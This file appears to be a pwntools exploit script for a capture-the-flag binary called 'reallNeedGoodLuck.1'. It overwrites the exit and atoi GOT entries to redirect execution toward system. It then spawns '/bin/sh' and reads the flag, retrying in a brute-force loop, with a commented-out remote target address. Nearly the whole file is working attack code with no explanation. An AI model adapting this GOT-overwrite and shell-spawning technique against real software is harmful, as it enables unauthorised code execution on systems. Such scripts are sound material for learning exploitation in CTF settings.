# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
#io = remote('127.0.0.1', 6010)
# libc = ELF('./libc-2.31.so')
# io = process(['./test', 'real'])
#io = process('./reallNeedGoodLuck.1')
#libc=ELF('/glibc/2.23/64/lib/libc-2.23.so')
elf=ELF('./reallNeedGoodLuck.1')

#p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, b'\x00'))
uu64 = lambda data		: u64(data.ljust(8, b'\x00'))
ur64 = lambda data		: u64(data.rjust(8, b'\x00'))


exit_got=elf.got['exit']
read_got=elf.got['read']
atoi_got=elf.got['atoi']
print hex(atoi_got)
def pwn():
    #io=remote('47.106.172.144',65003)
    ru('good')
    sn(p32(0x4011A9)) # main addr
    ru('luck! ')
    sn(str(exit_got))
    dbg()
    ru('good')
    sleep(0.1)
    sn('\x00\x00\xa0\xf3') # system
    ru('luck! ')
    sn(str(atoi_got-2)) # atoi

    ru('good')
    sn(p32(0)) # 
    sl(b'/bin/sh\x00')

    sl('ls')
    sl('ls')
    ru('flag')
    sl('cat flag')


    irt()
while True:
    try:
        # io=remote('47.106.172.144',65003)
        io=process('./reallNeedGoodLuck.1')
        #dbg()
        pwn()

    except:
        io.close()
        continue

